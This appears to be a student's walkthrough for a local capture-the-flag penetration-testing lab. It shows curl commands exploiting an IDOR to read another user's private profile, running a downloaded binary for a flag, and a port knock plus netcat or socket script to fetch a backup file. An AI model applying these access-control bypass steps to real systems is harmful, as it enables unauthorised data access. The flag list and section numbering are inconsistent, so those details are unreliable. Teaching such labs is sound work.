# CITS3006 Penetration Testing


Two Flags
1. `FLAG{th1s_!s_s3cre11t_f16g}`
2. `FLAG{c1tsE006_no1_s3cr4t_4lag}`
3. `FLAG{Bob_7hE_BUiLDerFL@9}`

Do not expose the service to an untrusted network while following these steps;
the application is intentionally vulnerable.

## 1. Start the lab

Open PowerShell in the directory containing `server.py`:

```powershell
Set-Location 'C:\Users\Merab\OneDrive - UWA\Uni_related\CTF'
python server.py
```

Leave that terminal running. The server starts:

- the web application on `127.0.0.1:8001`;
- the port-knock listeners on `8002`, `8003`, and `8004`;
- the backup service on TCP port `9000`.

Open a second PowerShell window and use the same repository directory:

```powershell
Set-Location 'C:\Users\Merab\OneDrive - UWA\Uni_related\CTF'
```

## 2. Flag 1: IDOR vulnerability

### 2.1 Vulnerability Classification

### 2.2 Step by step walkthrough

#### Discovering Bob'd UUID
The public Authors page displays the UUID used by each author profile. We can get all the authors with the corresponding information, then match the pattern Bob and get Bob's UUID. It can be done 2 ways:

1. Using powershell:
```bash
authors=$(curl -s http://127.0.0.1:8001/authors)
echo "$authors" | grep 'Bob'
```
It should print out something like this:
06ac561c-7086-497d-a3e8-67467c6c4caf

2. Directly from the public HTML:

  1. Navigate to the authors screen
  2. From authors screen navigate to Bob's profile
  3. You can copy from the URL bar exposed Bob's userID that is used to identify each user.

### 2.2 Log in as any seeded user

The IDOR requires authentication, but it does not require the account being requested to match the logged-in account. 
Log in as Alice and save the session
cookie:

```powershell
curl.exe -i -c cookies.txt -d 'username=alice&password=alicepass' `
  http://127.0.0.1:8001/login
```

### 2.3 Request Bob's private profile while logged in as Alice

```powershell
curl.exe -s -b cookies.txt `
  'http://127.0.0.1:8001/users/user?userid=06ac561c-7086-497d-a3e8-67467c6c4caf' `
  -o bob-profile.html

Select-String -Path bob-profile.html -Pattern 'Top_Secret|/files/'
```

The response includes Bob's private downloadable file and the file endpoint:

```text
/files/13
```

The application checks only that a session exists. It does not check that the
requested `userid` belongs to the logged-in user.

## 3. Flag 2 Reverse Engeneering

### 

We are able to download `Top_Secret` file that is a linux ELF executable. We can run it to see what exactly it does.

```
./Top_Secret
```
Or
```powershell
wsl -- ./Top_Secret
```

When prompted, enter:

```text
Sup3rR3v3rs3!
```

The executable prints:

```text
FLAG{th1s_!s_s3cre11t_f16g}
```

## 3. Flag 3 backup-service flag

### 3.1 Perform the port knock

From the second PowerShell window, run:

```powershell
python knock.py 127.0.0.1
```

The knock must reach ports `8002`, `8003`, and `8004` in that order, with no more than five seconds between attempts. If port knock was successful you will see the following text:

```text
Port knock accepted. Open http://127.0.0.1:8001
```

The knock unlocks the backup service for 60 seconds for the source address.

### 3.2 Connect to TCP port 9000

You can use Netcat if installed, run:

```bash
nc 127.0.0.1 9000
```

You will see the commands to use the backup-service:

```text
LIST
GET backup.txt
QUIT
```

First run the `LIST` to see the contents:

```
backup.txt
```
Then `GET backup.txt`, and inspect the file where you will find the last flag:

```text
FLAG{c1tsE006_no1_s3cr4t_4lag}
```

If `nc` is unavailable, use Ncat if it is installed:

```bash
ncat 127.0.0.1 9000
```

Alternatively, the complete interaction can be performed with Python after
running `python knock.py 127.0.0.1`:

```powershell
@'
import socket

with socket.create_connection(("127.0.0.1", 9000), timeout=5) as s:
    print(s.recv(4096).decode(errors="replace"), end="")
    s.sendall(b"LIST\n")
    print(s.recv(4096).decode(errors="replace"), end="")
    s.sendall(b"GET backup.txt\n")
    print(s.recv(4096).decode(errors="replace"), end="")
    s.sendall(b"QUIT\n")
    print(s.recv(4096).decode(errors="replace"), end="")
'@ | python -
```

If the service reports `ERROR complete the port knock first`, repeat the knock
and connect immediately; the unlock expires after 60 seconds.